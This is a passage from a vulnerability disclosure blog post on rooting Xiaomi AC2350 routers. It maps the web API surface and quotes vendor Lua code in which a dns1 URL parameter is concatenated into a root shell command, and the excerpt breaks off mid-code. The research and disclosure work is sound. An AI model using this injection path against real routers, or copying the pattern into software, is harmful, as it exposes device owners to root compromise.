<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=author content="Thalium Team"><meta name=description content="Thalium blog."><meta name=keywords content="blog,tech"><meta name=viewport content="width=device-width,minimum-scale=1,initial-scale=1"><meta name=generator content="Hugo 0.119.0"><link rel=canonical href=/posts/rooting-xiaomi-wifi-routers/><meta property="og:title" content="Rooting Xiaomi WiFi Routers"><meta property="og:description" content="In this article, we discuss our research approach for investigating Xiaomi routers. We discovered multiple vulnerabilities allowing Remote Code Execution (RCE) on several models, through both LAN and WAN interfaces. This work led to the publication of four CVEs specifically targeting Xiaomi routers."><meta property="og:type" content="article"><meta property="og:url" content="/posts/rooting-xiaomi-wifi-routers/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-09-25T00:00:00+00:00"><meta property="article:modified_time" content="2023-09-25T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Rooting Xiaomi WiFi Routers"><meta name=twitter:description content="In this article, we discuss our research approach for investigating Xiaomi routers. We discovered multiple vulnerabilities allowing Remote Code Execution (RCE) on several models, through both LAN and WAN interfaces. This work led to the publication of four CVEs specifically targeting Xiaomi routers."><meta itemprop=name content="Rooting Xiaomi WiFi Routers"><meta itemprop=description content="In this article, we discuss our research approach for investigating Xiaomi routers. We discovered multiple vulnerabilities allowing Remote Code Execution (RCE) on several models, through both LAN and WAN interfaces. This work led to the publication of four CVEs specifically targeting Xiaomi routers."><meta itemprop=datePublished content="2023-09-25T00:00:00+00:00"><meta itemprop=dateModified content="2023-09-25T00:00:00+00:00"><meta itemprop=wordCount content="5685"><meta itemprop=keywords content="Xiaomi,Routers,CVE,Vulnerability Research,"><link rel=stylesheet href=/css/layout.css><link rel=stylesheet href=/css/default-dark.css><link rel=icon href=/favicon.ico><script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","UA-141692648-1","auto"),ga("send","pageview"))</script><script async src=https://www.google-analytics.com/analytics.js></script><title>Rooting Xiaomi WiFi Routers</title><script>MathJax={tex:{inlineMath:[["∳","∳"]],displayMath:[["∳∳","∳∳"]],processEscapes:!0},svg:{fontCache:"global"}}</script><script type=text/javascript id=MathJax-script async src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-svg.js></script></head><body><style>@font-face{font-family:days_one;src:url(/days_one.ttf)format('truetype')}.siteTitle{margin-top:24px}.siteTitle img{display:inline-block;vertical-align:middle;margin-top:-24px;margin-right:-10px}.siteTitle span{font-family:days_one,Fallback,sans-serif;color:#fff;font-size:160%}</style><div class=main><header><div class=header-bar><nav><div class=siteTitle><a href=/><img src=/shard_only_no_background.png width=12%></img>
<span>THALIUM</span></a></div><a class=nav-item href=/posts/><div class=nav-item-title>Posts</div></a><a class=nav-item href=/joinus/><div class=nav-item-title>Join Us</div></a><a class=nav-item href=/about/><div class=nav-item-title>About</div></a></nav><div class=social-links-header><a href=mailto:contact@thalium.re><div class=social-link>Email</div></a><a href=https://github.com/thalium target=_blank><div class=social-link>Github</div></a><a href=https://twitter.com/thalium_team target=_blank><div class=social-link>Twitter</div></a></div></div></header><article class=post><h1 class=title>Rooting Xiaomi WiFi Routers</h1><div class=content><h1 id=table-of-contents>Table of contents</h1><ul><li><a href=#table-of-contents>Table of contents</a></li><li><a href=#introduction>Introduction</a></li><li><a href=#environment>Environment</a></li><li><a href=#attack-surface>Attack Surface</a><ul><li><a href=#lan>LAN</a></li><li><a href=#wan>WAN</a></li></ul></li><li><a href=#vulnerability-details>Vulnerability Details</a><ul><li><a href=#lan-1>LAN</a><ul><li><a href=#post-authorization>Post-authorization</a><ul><li><a href=#endpoint-apixqnetworkset_wan6---command-injection-already-known-as-cve-2020-14100>Endpoint <code>/api/xqnetwork/set_wan6</code> - Command Injection (already known as CVE-2020-14100)</a></li><li><a href=#endpoint-apixqsmarthomerequest_smartcontroller---command-injection-cve-2023-26319>Endpoint <code>/api/xqsmarthome/request_smartcontroller</code> - Command Injection (CVE-2023-26319)</a></li><li><a href=#endpoint-apixqsmarthomerequest_smartcontroller---stack-buffer-overflow-cve-2023-26318>Endpoint <code>/api/xqsmarthome/request_smartcontroller</code> - Stack Buffer Overflow (CVE-2023-26318)</a></li><li><a href=#endpoint-apixqsmarthomerequest_smartcontroller---another-command-injection>Endpoint <code>/api/xqsmarthome/request_smartcontroller</code> - Another Command Injection</a></li></ul></li><li><a href=#pre-authorization>Pre-authorization</a><ul><li><a href=#endpoint-apimisystemget_wifi_pwd_url---pk_free>Endpoint <code>/api/misystem/get_wifi_pwd_url</code> - pk_free()</a></li><li><a href=#endpoint-apimisystemget_wifi_pwd_url---stack-buffer-overflow-already-known-as-cve-2020-14124>Endpoint <code>/api/misystem/get_wifi_pwd_url</code> - Stack Buffer Overflow (already known as CVE-2020-14124)</a></li><li><a href=#endpoint-apimisystemget_wifi_pwd_url---memcmp>Endpoint <code>/api/misystem/get_wifi_pwd_url</code> - memcmp()</a></li></ul></li></ul></li><li><a href=#wan-1>WAN</a><ul><li><a href=#binary-usrbinmessagingagent---command-injection-cve-2023-26317>Binary <code>/usr/bin/messagingagent</code> - Command Injection (CVE-2023-26317)</a></li><li><a href=#binary-usrbinmessagingagent---stack-buffer-overflow-cve-2023-26320>Binary <code>/usr/bin/messagingagent</code> - Stack Buffer Overflow (CVE-2023-26320)</a></li></ul></li></ul></li><li><a href=#some-affected-products>Some affected products</a></li><li><a href=#conclusion>Conclusion</a></li><li><a href=#timeline>Timeline</a></li></ul><h1 id=introduction>Introduction</h1><p>Our research focused on the <code>MI AIoT Router AC2350</code> with the aim to obtain remote code execution on the LAN and WAN interfaces. We found several vulnerabilities in the router that allow an attacker to gain root access to the router. We sent 8 reports to Xiaomi on their <a href="https://hackerone.com/xiaomi?type=team">HackerOne bug bounty program</a> — all the bugs should be fixed in the latest firmware updates according to them.</p><p>Previous research by <a href=https://hitcon.org/2020/slides/Exploit%20(Almost)%20All%20Xiaomi%20Routers%20Using%20Logical%20Bugs.pdf>Aobo Wang and Jihong Zheng at Hitcon 2020</a> demonstrated various vulnerabilities in Xiaomi routers.
However, during our analysis of the <code>MI AIoT Router AC2350,</code> we found that certain bugs, previously identified by Wang and Zheng in 2020, were still present. It seems these vulnerabilities hadn&rsquo;t been rectified in the most recent firmware updates for our router, including <a href=https://miuirom.org/miwifi/mi-aiot-router-ac2350>Global 3.0.36 and China 1.3.8</a>. They had only been fixed in the router version specified in the CVE descriptions, namely the <code>Mi AIoT Router AX3600.</code> As a result, we have decided to inform Xiaomi of these re-discovered bugs alongside our new ones.</p><h1 id=environment>Environment</h1><p>Xiaomi sells a wide variety of WiFi routers based on <a href=https://openwrt.org/>OpenWrt</a>. Therefore, the web functions are served through OpenWrt&rsquo;s <code>luci</code> Lua package. Fortunately, in comparison to other firmwares from Xiaomi routers, the Lua scripts containing the web functions were not encrypted, allowing us to easily analyze the code and pinpoint the API functions.</p><p>All binaries are executed as <code>root</code> and, therefore, any vulnerability that allows arbitrary code execution on the router will result in a <code>root</code> access. This is interesting as even a command injection found through the web interface results in the highest level of access to the operating system.</p><p>Similarly to most WiFi routers, an authentication portal is available on the router&rsquo;s web interface and different permission levels protect access to certain API functions. After authenticating on the web portal, a token is generated and is sent in the URL to signify that the user is authenticated. This authorization token can be found in the <code>stok</code> URL parameter.</p><p><a href=/posts/img/xiaomi-routers/lan_logged_in.png target=_blank><img src=/posts/img/xiaomi-routers/lan_logged_in.png alt="logged in"></a></p><p>Furthermore, it is important to keep in mind that the router runs on a <code>32-bit big-endian MIPS CPU</code>: to get more tools than what the firmware&rsquo;s <code>busybox</code> can offer (e.g. <code>gdb</code>, <code>gdbserver</code>, <code>strace</code>, <code>socat</code> &mldr;), we can, for example, look for <a href=https://github.com/darkerego/mips-binaries>precompiled binaries</a> online or build a complete toolchain using <a href=https://github.com/buildroot/buildroot>buildroot</a> to compile a kernel with a filesystem in order to emulate the router with <code>QEMU</code>.</p><p>Finally, we can note that even if most of the binaries are compiled without any protections (no PIE, no NX, no stack canary, partial/no RELRO), ASLR is active on the router. The big-endianness does not allow us to only overwrite the end of addresses in the same way we could in little endian. In addition, non-PIE binaries are mapped at the virtual address <code>0x00400000</code> which starts with a null byte and will cause us some issues later for exploitation.</p><h1 id=attack-surface>Attack Surface</h1><p>WiFi routers have two accessible interfaces, LAN and WAN: the LAN interface is accessible once a device is connected to its WiFi and the WAN interface is accessible through the internet.</p><p>Within the LAN interface, we can further distinguish pre-authorization and post-authorization attacks. Pre-authorization attacks can be done without authentication, by any device connected to the WiFi, while post-authorization attacks require authentication (user:password) on the router&rsquo;s web interface, accessible at <code>http://192.168.31.1</code>.</p><p><a href=/posts/img/xiaomi-routers/lan_not_loggedin.png target=_blank><img src=/posts/img/xiaomi-routers/lan_not_loggedin.png alt="not logged in"></a></p><h2 id=lan>LAN</h2><p>For LAN vulnerabilities, we focused on the web API functions to execute commands on the router.</p><p>To analyze all API functions we scraped every file containing the string <code>entry({"api"</code> as this turned out to be the endpoint source. Furthermore, this technique lets us identify the associated functions and authorization levels required to execute the different API calls.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>soeasy@ubuntu:~/router/fs $ grep -Rs <span style=color:#e6db74>&#34;entry({\&#34;api&#34;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>usr/lib/lua/luci/controller/api/xqnetwork.lua:    entry<span style=color:#f92672>({</span><span style=color:#e6db74>&#34;api&#34;</span>, <span style=color:#e6db74>&#34;xqnetwork&#34;</span>, <span style=color:#e6db74>&#34;set_wifi_weak&#34;</span><span style=color:#f92672>}</span>, call<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;setWifiWeakInfo&#34;</span><span style=color:#f92672>)</span>, <span style=color:#f92672>(</span><span style=color:#e6db74>&#34;&#34;</span><span style=color:#f92672>)</span>, 286<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>usr/lib/lua/luci/controller/api/xqnetwork.lua:    entry<span style=color:#f92672>({</span><span style=color:#e6db74>&#34;api&#34;</span>, <span style=color:#e6db74>&#34;xqnetwork&#34;</span>, <span style=color:#e6db74>&#34;get_wifi_weak&#34;</span><span style=color:#f92672>}</span>, call<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;getWifiWeakInfo&#34;</span><span style=color:#f92672>)</span>, <span style=color:#f92672>(</span><span style=color:#e6db74>&#34;&#34;</span><span style=color:#f92672>)</span>, 287<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>usr/lib/lua/luci/controller/api/xqnetwork.lua:    entry<span style=color:#f92672>({</span><span style=color:#e6db74>&#34;api&#34;</span>, <span style=color:#e6db74>&#34;xqnetwork&#34;</span>, <span style=color:#e6db74>&#34;set_wan6&#34;</span><span style=color:#f92672>}</span>, call<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;setWan6&#34;</span><span style=color:#f92672>)</span>, <span style=color:#f92672>(</span><span style=color:#e6db74>&#34;&#34;</span><span style=color:#f92672>)</span>, 223, 0x08<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>usr/lib/lua/luci/controller/api/xqnetwork.lua:    entry<span style=color:#f92672>({</span><span style=color:#e6db74>&#34;api&#34;</span>, <span style=color:#e6db74>&#34;xqnetwork&#34;</span>, <span style=color:#e6db74>&#34;ipv6_status&#34;</span><span style=color:#f92672>}</span>, call<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;ipv6Status&#34;</span><span style=color:#f92672>)</span>, <span style=color:#f92672>(</span><span style=color:#e6db74>&#34;&#34;</span><span style=color:#f92672>)</span>, 223, 0x08<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>usr/lib/lua/luci/controller/api/xqnetwork.lua:    entry<span style=color:#f92672>({</span><span style=color:#e6db74>&#34;api&#34;</span>, <span style=color:#e6db74>&#34;xqnetwork&#34;</span>, <span style=color:#e6db74>&#34;miscan_switch&#34;</span><span style=color:#f92672>}</span>, call<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;miscanSwitch&#34;</span><span style=color:#f92672>)</span>, <span style=color:#f92672>(</span><span style=color:#e6db74>&#34;&#34;</span><span style=color:#f92672>)</span>, 290<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>usr/lib/lua/luci/controller/api/xqnetwork.lua:    entry<span style=color:#f92672>({</span><span style=color:#e6db74>&#34;api&#34;</span>, <span style=color:#e6db74>&#34;xqnetwork&#34;</span>, <span style=color:#e6db74>&#34;get_miscan_switch&#34;</span><span style=color:#f92672>}</span>, call<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;getMiscanSwitch&#34;</span><span style=color:#f92672>)</span>, <span style=color:#f92672>(</span><span style=color:#e6db74>&#34;&#34;</span><span style=color:#f92672>)</span>, 291<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>usr/lib/lua/luci/controller/api/xqnetwork.lua:    entry<span style=color:#f92672>({</span><span style=color:#e6db74>&#34;api&#34;</span>, <span style=color:#e6db74>&#34;xqnetwork&#34;</span>, <span style=color:#e6db74>&#34;set_wifi_txbf&#34;</span><span style=color:#f92672>}</span>, call<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;setWifiTxbf&#34;</span><span style=color:#f92672>)</span>, <span style=color:#f92672>(</span><span style=color:#e6db74>&#34;&#34;</span><span style=color:#f92672>)</span>, 295<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>usr/lib/lua/luci/controller/api/xqnetwork.lua:    entry<span style=color:#f92672>({</span><span style=color:#e6db74>&#34;api&#34;</span>, <span style=color:#e6db74>&#34;xqnetwork&#34;</span>, <span style=color:#e6db74>&#34;set_wifi_ax&#34;</span><span style=color:#f92672>}</span>, call<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;setWifiAx&#34;</span><span style=color:#f92672>)</span>, <span style=color:#f92672>(</span><span style=color:#e6db74>&#34;&#34;</span><span style=color:#f92672>)</span>, 296<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>usr/lib/lua/luci/controller/api/xqsmarthome.lua:    entry<span style=color:#f92672>({</span><span style=color:#e6db74>&#34;api&#34;</span>, <span style=color:#e6db74>&#34;xqsmarthome&#34;</span><span style=color:#f92672>}</span>, firstchild<span style=color:#f92672>()</span>, _<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;&#34;</span><span style=color:#f92672>)</span>, 500<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>usr/lib/lua/luci/controller/api/xqsmarthome.lua:    entry<span style=color:#f92672>({</span><span style=color:#e6db74>&#34;api&#34;</span>, <span style=color:#e6db74>&#34;xqsmarthome&#34;</span>, <span style=color:#e6db74>&#34;request&#34;</span><span style=color:#f92672>}</span>, call<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;tunnelSmartHomeRequest&#34;</span><span style=color:#f92672>)</span>, _<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;&#34;</span><span style=color:#f92672>)</span>, 501<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>usr/lib/lua/luci/controller/api/xqsmarthome.lua:    entry<span style=color:#f92672>({</span><span style=color:#e6db74>&#34;api&#34;</span>, <span style=color:#e6db74>&#34;xqsmarthome&#34;</span>, <span style=color:#e6db74>&#34;request_smartcontroller&#34;</span><span style=color:#f92672>}</span>, call<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;tunnelSmartControllerRequest&#34;</span><span style=color:#f92672>)</span>, _<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;&#34;</span><span style=color:#f92672>)</span>, 502<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>usr/lib/lua/luci/controller/api/xqsmarthome.lua:    entry<span style=color:#f92672>({</span><span style=color:#e6db74>&#34;api&#34;</span>, <span style=color:#e6db74>&#34;xqsmarthome&#34;</span>, <span style=color:#e6db74>&#34;request_miio&#34;</span><span style=color:#f92672>}</span>, call<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;tunnelMiioRequest&#34;</span><span style=color:#f92672>)</span>, _<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;&#34;</span><span style=color:#f92672>)</span>, 503<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>usr/lib/lua/luci/controller/api/xqsmarthome.lua:    entry<span style=color:#f92672>({</span><span style=color:#e6db74>&#34;api&#34;</span>, <span style=color:#e6db74>&#34;xqsmarthome&#34;</span>, <span style=color:#e6db74>&#34;request_mitv&#34;</span><span style=color:#f92672>}</span>, call<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;requestMitv&#34;</span><span style=color:#f92672>)</span>, _<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;&#34;</span><span style=color:#f92672>)</span>, 504<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>usr/lib/lua/luci/controller/api/xqsmarthome.lua:    entry<span style=color:#f92672>({</span><span style=color:#e6db74>&#34;api&#34;</span>, <span style=color:#e6db74>&#34;xqsmarthome&#34;</span>, <span style=color:#e6db74>&#34;request_yeelink&#34;</span><span style=color:#f92672>}</span>, call<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;tunnelYeelink&#34;</span><span style=color:#f92672>)</span>, _<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;&#34;</span><span style=color:#f92672>)</span>, 505<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>usr/lib/lua/luci/controller/api/xqsmarthome.lua:    entry<span style=color:#f92672>({</span><span style=color:#e6db74>&#34;api&#34;</span>, <span style=color:#e6db74>&#34;xqsmarthome&#34;</span>, <span style=color:#e6db74>&#34;request_camera&#34;</span><span style=color:#f92672>}</span>, call<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;requestCamera&#34;</span><span style=color:#f92672>)</span>, _<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;&#34;</span><span style=color:#f92672>)</span>, 506<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>usr/lib/lua/luci/controller/api/xqsmarthome.lua:    entry<span style=color:#f92672>({</span><span style=color:#e6db74>&#34;api&#34;</span>, <span style=color:#e6db74>&#34;xqsmarthome&#34;</span>, <span style=color:#e6db74>&#34;request_miiolist&#34;</span><span style=color:#f92672>}</span>, call<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;requestMiioList&#34;</span><span style=color:#f92672>)</span>, _<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;&#34;</span><span style=color:#f92672>)</span>, 507<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>soeasy@ubuntu:~/router/fs $ grep -Rs <span style=color:#e6db74>&#34;entry({\&#34;api&#34;</span> | wc -l
</span></span><span style=display:flex><span><span style=color:#ae81ff>476</span>
</span></span></code></pre></div><p>We can then interpret each line like this:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-lua data-lang=lua><span style=display:flex><span><span style=color:#75715e>--- API endpoint: `/api/xqnetwork/pppoe_catch` - Corresponding Lua function: `pppoeCatch()` - Authorization Flag: `0x09`</span>
</span></span><span style=display:flex><span>entry({<span style=color:#e6db74>&#34;api&#34;</span>, <span style=color:#e6db74>&#34;xqnetwork&#34;</span>, <span style=color:#e6db74>&#34;pppoe_catch&#34;</span>}, call(<span style=color:#e6db74>&#34;pppoeCatch&#34;</span>), (<span style=color:#e6db74>&#34;&#34;</span>), <span style=color:#ae81ff>264</span>, <span style=color:#ae81ff>0x09</span>)
</span></span></code></pre></div><p>To understand the authorization flags, which is visibly a custom feature that Xiaomi implemented because it&rsquo;s not in the <a href=https://github.com/openwrt/luci/blob/b17650fbd23ee9028b8a7aa55e3a9615ddf934f8/modules/luci-lua-runtime/luasrc/dispatcher.lua#L50>original luci&rsquo;s source code</a>, we can have a look at the flag checking functions in <code>/usr/lib/lua/luci/dispatcher.lua</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-lua data-lang=lua><span style=display:flex><span>[...]
</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>_remoteAccessForbidden</span>(flag)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> flag <span style=color:#f92672>==</span> <span style=color:#66d9ef>nil</span> <span style=color:#66d9ef>then</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>end</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> bit.band(flag, <span style=color:#ae81ff>0x02</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x02</span> <span style=color:#66d9ef>then</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>true</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>end</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>end</span>
</span></span><span style=display:flex><span>[...]
</span></span></code></pre></div><p>The different authorization flags are the following, and can of course be combined:</p><ul><li><code>0x01</code>: &ldquo;_noauthAccessAllowed&rdquo;</li><li><code>0x02</code>: &ldquo;_remoteAccessForbidden&rdquo;</li><li><code>0x04</code>: &ldquo;_syslockAccessAllowed&rdquo;</li><li><code>0x08</code>: &ldquo;_noinitAccessAllowed&rdquo;</li><li><code>0x10</code>: &ldquo;_sdkFilter&rdquo;</li></ul><p>We found roughly 500 API endpoints and initiated the grunt work of analyzing all of them, separating them into categories based on their permission levels.
The first target functions in the Lua code were <code>os.execute</code>, <code>forkExec</code>, <code>io.popen</code>&mldr; as they allow direct command execution on the router. However, we also dove into the functions that branched out to router binaries in order to find lower-level vulnerabilities through reverse engineering.</p><p>Indeed, certain API functions will directly invoke binaries with user-controlled parameters through the URL to perform some tasks. Meaning, if the called binary is vulnerable, a specially crafted URL could potentially lead to code execution in the called program.</p><h2 id=wan>WAN</h2><p>For WAN vulnerabilities, we approached the problem by following Pwn2Own&rsquo;s method of intercepting the traffic on the WAN interface. Acting as a man-in-the-middle, we emulated a <code>DHCP</code> and <code>DNS</code> server using <code>dnsmasq</code>, thus redirecting the traffic to our machine. We noticed many <code>HTTP</code> requests, giving us and any attackers the ability to intercept and modify the traffic. This proved to be fruitful in finding vulnerabilities as we will later see in this article.</p><h1 id=vulnerability-details>Vulnerability Details</h1><p>In this section, we will detail the multiple vulnerabilities we found in the router. The initial goal was to have a root shell on the router as it would be useful for future debugs. We followed a bottom-up approach regarding the level of authorization: consequently, we first looked at the LAN interface with the highest level of authorization (LAN post-auth), continued with LAN pre-auth, and finished with WAN.</p><h2 id=lan-1>LAN</h2><p>To analyze the LAN attack surfaces we only focused on the web interface. Meaning, our research consisted in following the different endpoints and statically auditing their code.</p><h3 id=post-authorization>Post-authorization</h3><p>Post-authorization means that an authentication token is sent with the request, so the admin password is required. In the end, we found three RCEs on the LAN post-authorization surface. While two of these bugs were duplicates, they still served their purpose as a foothold onto the router which drastically helped in the search for other vulnerabilities.</p><h4 id=endpoint-apixqnetworkset_wan6---command-injection-already-known-as-cve-2020-14100>Endpoint <code>/api/xqnetwork/set_wan6</code> - Command Injection (already known as CVE-2020-14100)</h4><p>The first vulnerability was a known RCE from 2020. An unsanitized url parameter is injected into a shell command thus resulting in arbitrary command injection. This command injection is known by Xiaomi, however, it was not fixed in this particular firmware.</p><p>The API endpoint <code>/api/xqnetwork/set_wan6</code>, used to set IPv6 settings, calls the function <code>setWan6()</code> in <code>/usr/lib/lua/luci/controller/api/xqnetwork.lua</code>, and accepts multiple url parameters. The url parameter <code>dns1</code> can be abused to inject commands in the <code>XQFunction.forkExec()</code> method, which executes bash commands on the router. This vulnerability can be seen here:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-lua data-lang=lua><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>index</span>()
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>local</span> page   <span style=color:#f92672>=</span> node(<span style=color:#e6db74>&#34;api&#34;</span>,<span style=color:#e6db74>&#34;xqnetwork&#34;</span>)
</span></span><span style=display:flex><span>    page.target  <span style=color:#f92672>=</span> firstchild()
</span></span><span style=display:flex><span>    page.title   <span style=color:#f92672>=</span> (<span style=color:#e6db74>&#34;&#34;</span>)
</span></span><span style=display:flex><span>    page.order   <span style=color:#f92672>=</span> <span style=color:#ae81ff>200</span>
</span></span><span style=display:flex><span>    page.sysauth <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;admin&#34;</span>
</span></span><span style=display:flex><span>    page.sysauth_authenticator <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;jsonauth&#34;</span>
</span></span><span style=display:flex><span>    page.index <span style=color:#f92672>=</span> <span style=color:#66d9ef>true</span>
</span></span><span style=display:flex><span>    [...]
</span></span><span style=display:flex><span>    entry({<span style=color:#e6db74>&#34;api&#34;</span>, <span style=color:#e6db74>&#34;xqnetwork&#34;</span>, <span style=color:#e6db74>&#34;set_wan6&#34;</span>}, call(<span style=color:#e6db74>&#34;setWan6&#34;</span>), (<span style=color:#e6db74>&#34;&#34;</span>), <span style=color:#ae81ff>223</span>, <span style=color:#ae81ff>0x08</span>)
</span></span><span style=display:flex><span>    [...]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>setWan6</span>()
</span></span><span style=display:flex><span>    [...]
</span></span><span style=display:flex><span>    <span style=color:#75715e>--- `dn1` is retrieved here</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>local</span> dns1 <span style=color:#f92672>=</span> XQSecureUtil.parseCmdline(LuciHttp.formvalue(<span style=color:#e6db74>&#34;dns1&#34;</span>))
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>local</span> dns2 <span style=color:#f92672>=</span> XQSecureUtil.parseCmdline(LuciHttp.formvalue(<span style=color:#e6db74>&#34;dns2&#34;</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> XQFunction.isStrNil(wanType)
</span></span><span style=display:flex><span>        <span style=color:#f92672>and</span> XQFunction.isStrNil(ip6addr)
</span></span><span style=display:flex><span>        <span style=color:#f92672>and</span> XQFunction.isStrNil(ip6gw)
</span></span><span style=display:flex><span>        <span style=color:#f92672>and</span> XQFunction.isStrNil(ip6prefix) <span style=color:#66d9ef>then</span>
</span></span><span style=display:flex><span>            code <span style=color:#f92672>=</span> <span style=color:#ae81ff>1502</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> wanType <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;native&#34;</span> <span style=color:#66d9ef>then</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> XQFunction.isStrNil(dns1) <span style=color:#f92672>and</span> XQFunction.isStrNil(dns2) <span style=color:#66d9ef>then</span>
</span></span><span style=display:flex><span>                XQFunction.forkExec(<span style=color:#e6db74>&#34;sleep 2; /etc/init.d/ipv6 native&#34;</span>)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>elseif</span> <span style=color:#f92672>not</span> XQFunction.isStrNil(dns1) <span style=color:#f92672>and</span> XQFunction.isStrNil(dns2) <span style=color:#66d9ef>then</span>
</span></span><span style=display:flex><span>                XQFunction.forkExec(<span style=color:#e6db74>&#34;sleep 2; /etc/init.d/ipv6 native &#34;</span> <span style=color:#f92672>..</span> dns1)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>elseif</span> XQFunction.isStrNil(dns1) <span style=color:#f92672>and</span> <span style=color:#f92672>not</span> XQFunction.isStrNil(dns2) <span style=color:#66d9ef>then</span>
</span></span><span style=display:flex><span>                XQFunction.forkExec(<span style=color:#e6db74>&#34;sleep 2; /etc/init.d/ipv6 native &#34;</span> <span style=color:#f92672>..</span> dns2)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>                <span style=color:#75715e>--- `dns1` is injected into a shell command here by a simple concatenation!</span>
</span></span><span style=display:flex><span>                XQFunction.forkExec(
</span></span><span style=display:flex><span>                    <span style=color:#e6db74>&#34;sleep 2; /etc/init.d/ipv6 native &#34;</span> <span style=color:#f92672>..</span> dns1 <span style=color:#f92672>..</span> <span style=color:#e6db74>&#39;,&#39;</span> <span style=color:#f92672>..</span> dns2
</span></span><span style=display:flex><span>                )
</span></span><span style=display:flex><span>    [...]
</span></span></code></pre></div><p>The potentially problematic function here would be the parsing function <code>XQSecureUtil.parseCmdline</code>, declared in <code>/usr/lib/lua/xiaoqiang/util/XQSecureUtil.lua</code>, which will attempt to sanitize the input by escaping different characters.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-lua data-lang=lua><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>parseCmdline</span>(str)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> XQFunction.isStrNil(str) <span style=color:#66d9ef>then</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>
